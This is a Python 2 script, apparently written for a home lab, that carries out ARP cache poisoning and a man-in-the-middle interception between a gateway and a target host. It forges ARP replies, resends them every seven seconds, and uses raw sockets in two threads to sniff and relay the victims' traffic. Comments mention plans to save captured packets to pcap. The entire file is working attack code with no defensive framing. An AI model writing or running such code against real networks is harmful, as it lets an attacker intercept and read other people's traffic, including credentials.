#!/usr/bin/python

#gateway is at .100, 08:00:27:3b:24:84
#attacking host is at .101, 08:00:27:f3:17:4b
#target host is at .102, 08:00:27:c5:1e:3c
#want to make threads save packets to a pcap file
#want to make a keyboardinterrupt save files and close threads

import socket, sys, time, threading, binascii, struct
from struct import *

BINDTUP = ("eth0", 0)

def macaddrtobytestr(addr):
  return "".join([chr(int(x, 16)) for x in addr.split(':')])

#glad this isn't little endian
def arppacket(destmac, destaddr, sourcemac, sourceaddr):
    #for ARP poisoning, destination addresses are the target addresses to poison ARP cache of
    #source MAC address is this hosts
    #source IP address is the target to be spoofed
    packet = ''
    packet += destmac
    packet += sourcemac
    packet += "\x08\x06" #ARP opcode, end of ethernet header
    packet += "\x00\x01" #Ethernet hardware type
    packet += "\x08\x00" #IP protocol
    packet += "\x06\x04" #MAC address size, IP address size
    packet += "\x00\x02" #ARP reply
    packet += sourcemac
    packet += sourceaddr
    packet += destmac
    packet += destaddr
    packet += "\x00" * 18
    return packet

def packetsniff(targetip, targetmac, attackmac):
    #create receiving and sending packets
    rs=socket.socket(socket.PF_PACKET,socket.SOCK_RAW,socket.htons(0x0800))
    rs.bind(BINDTUP)
    ss = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    ss.bind(BINDTUP)
    print "Starting sniffer on {}".format(socket.inet_ntoa(targetip))
    
    while True:
        #receive packets, forward them if the targetip is in it (isn't perfect, but good enough)
        rp = rs.recv(2048)
        if targetip in rp:
            newp = rp.replace(attackmac, targetmac)
            ss.send(newp)

def main():
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    s.bind(BINDTUP)

    packet = ''
    targetip = "192.168.56.102"
    sourceip = "192.168.56.101"
    destip = "192.168.56.100"

    targetmac = macaddrtobytestr("08:00:27:c5:1e:3c")
    sourcemac = macaddrtobytestr("08:00:27:f3:17:4b")
    destmac = macaddrtobytestr("08:00:27:3b:24:84")

    sourceaddr = socket.inet_aton(sourceip)
    destaddr = socket.inet_aton(destip)
    targetaddr = socket.inet_aton(targetip)
    
    #set up poisoning for gateway, forward packets to target
    poisonpacket1 = arppacket(destmac, destaddr, sourcemac, targetaddr)
    t1 = threading.Thread(target=packetsniff, args=(targetaddr, targetmac, sourcemac))
    t1.start()

    #set up poisoning for target, forward packets to gateway
    poisonpacket2 = arppacket(targetmac, targetaddr, sourcemac, destaddr)
    t2 = threading.Thread(target=packetsniff, args=(destaddr, destmac, sourcemac))
    t2.start()

    while True:
        s.send(poisonpacket1)
        s.send(poisonpacket2)
        time.sleep(7)

if __name__ == "__main__":
    main()
